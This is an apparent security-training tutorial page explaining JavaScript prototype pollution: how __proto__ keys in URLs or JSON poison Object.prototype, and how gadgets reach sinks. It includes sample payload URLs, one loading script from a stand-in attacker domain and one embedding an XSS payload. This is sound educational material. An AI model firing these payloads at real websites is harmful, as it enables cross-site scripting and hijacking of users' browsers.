
What is prototype pollution? | Web Security Academy
My account
Products
Solutions
Research
Academy
Support
Company
Customers
About
Blog
Careers
Legal
Contact
Resellers
My account
Customers
About
Blog
Careers
Legal
Contact
Resellers
Burp AT
Agentic AI that extends human-led pentesting.
Burp Suite DAST
The enterprise-enabled dynamic web vulnerability scanner.
Burp Suite Professional
The world's #1 web penetration testing toolkit.
Burp Suite Community Edition
The best manual tools to start web security testing.
View all product editions
Burp Scanner
Burp Suite's web vulnerability scanner
Attack surface visibility
Improve security posture, prioritize manual testing, free up time.
CI-driven scanning
More proactive security - find and fix vulnerabilities earlier.
Application security testing
See how our software enables the world to secure the web.
DevSecOps
Catch critical bugs; ship more secure software, more quickly.
Penetration testing
Accelerate penetration testing - find more bugs, more quickly.
Automated scanning
Scale dynamic scanning. Reduce risk. Save time/money.
Bug bounty hunting
Level up your hacking and earn more bug bounties.
Compliance
Enhance security monitoring to comply with confidence.
View all solutions
Product comparison
What's the difference between Pro and DAST?
Support Center
Get help and advice from our experts on all things Burp.
Documentation
Tutorials and guides for Burp Suite.
Get Started - Professional
Get started with Burp Suite Professional.
Get Started - DAST
Get started with Burp Suite DAST.
Downloads
Download the latest version of Burp Suite.
Visit the Support Center
Downloads
Download the latest version of Burp Suite.
Academy home
Dashboard
Learning paths
Latest topics
Request smuggling
Web cache deception
Web LLM attacks
API testing
NoSQL injection
View all topics
All content
All labs
All topics
Mystery labs
Hall of Fame
Leaderboard
Interview - Kamil Vavra
Interview - Johnny Villarreal
Interview - Andres Rauschecker
Get started
Get certified
Get certified
How to prepare
How it works
Practice exam
Exam hints and guidance
What the exam involves
FAQs
Validate your certification
Back to all topics
Prototype pollution
What is prototype pollution?
JavaScript prototypes and inheritance
What is an object in JavaScript?
What is a prototype in JavaScript?
Object inheritance
Prototype chain
Accessing an object's prototype
Modifying prototypes
How vulnerabilities arise
Sources
URL
JSON input
Sinks
Gadgets
Client-side prototype pollution
Finding sources manually
Finding sources using DOM Invader
Finding gadgets manually
Finding gadgets using DOM Invader
Prototype pollution via the constructor
Bypassing flawed key sanitization
Prototype pollution in external libraries
Prototype pollution via browser APIs
fetch() method
Object.defineProperty() method
Server-side prototype pollution
Why is server-side prototype pollution more difficult to detect?
Detecting via polluted property reflection
Detecting without polluted property reflection
Status code override
JSON spaces override
Charset override
Scanning for sources
Bypassing input filters
Remote code execution
Identifying a vulnerable request
child_process.fork() method
child_process.execSync() method
Preventing vulnerabilities
Sanitizing property keys
Preventing changes to prototype objects
Preventing an object from inheriting properties
Using safer alternatives where possible
View all prototype pollution labs
Web Security Academy Prototype pollution
What is prototype pollution?
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.
Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS , while server-side prototype pollution can even result in remote code execution.
If you're unfamiliar with how prototypes and inheritance work in JavaScript, we recommend reading the following overview before continuing.
JavaScript prototypes and inheritance
Labs
If you're already familiar with prototype pollution and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic.
LABS View all prototype pollution labs How do prototype pollution vulnerabilities arise?
Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like __proto__ , along with arbitrary nested properties.
Due to the special meaning of __proto__ in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
It's possible to pollute any prototype object, but this most commonly occurs with the built-in global Object.prototype .
Successful exploitation of prototype pollution requires the following key components:
A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.
Prototype pollution sources
A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:
The URL via either the query or fragment string (hash)
JSON-based input
Web messages
Prototype pollution via the URL
Consider the following URL, which contains an attacker-constructed query string:
https://vulnerable-website.com/?__proto__[evilProperty]=payload
When breaking the query string down into key:value pairs, a URL parser may interpret __proto__ as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.
You might think that the __proto__ property, along with its nested evilProperty , will just be added to the target object as follows:
{
existingProperty1: 'foo',
existingProperty2: 'bar',
__proto__: {
evilProperty: 'payload'
}
}
However, this isn't the case. At some point, the recursive merge operation may assign the value of evilProperty using a statement equivalent to the following:
targetObject.__proto__.evilProperty = 'payload';
During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype , all objects in the JavaScript runtime will now inherit evilProperty , unless they already have a property of their own with a matching key.
In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.
Prototype pollution via JSON input
User-controllable objects are often derived from a JSON string using the JSON.parse() method. Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__ . This provides another potential vector for prototype pollution.
Let's say an attacker injects the following malicious JSON, for example, via a web message:
{
"__proto__": {
"evilProperty": "payload"
}
}
If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key __proto__ :
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
objectLiteral.hasOwnProperty('__proto__'); // false
objectFromJson.hasOwnProperty('__proto__'); // true
If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example .
Prototype pollution sinks
A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS .
As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
Prototype pollution gadgets
A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to null , which ensures that it doesn't inherit any properties at all.
Example of a prototype pollution gadget
Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:
let transport_url = config.transport_url || defaults.transport_url;
Now imagine the library code uses this transport_url to add a script reference to the page:
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
If the website's developers haven't set a transport_url property on their config object, this is a potential gadget. In cases where an attacker is able to pollute the global Object.prototype with their own transport_url property, this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing.
If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.
What next?
Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications:
LABS Client-side prototype pollution vulnerabilities LABS Server-side prototype pollution vulnerabilities Preventing prototype pollution vulnerabilities
Find prototype pollution vulnerabilities using Burp Suite
Try for free
Burp Suite
Web vulnerability scanner
Burp Suite Editions
Release Notes
Vulnerabilities
Cross-site scripting (XSS)
SQL injection
Cross-site request forgery
XML external entity injection
Directory traversal
Server-side request forgery
Customers
Organizations
Testers
Developers
Company
About
Careers
Contact
Legal
Privacy Notice
Modern Slavery Statement
Insights
Web Security Academy
Blog
Research
Follow us
© 2026 PortSwigger Ltd.
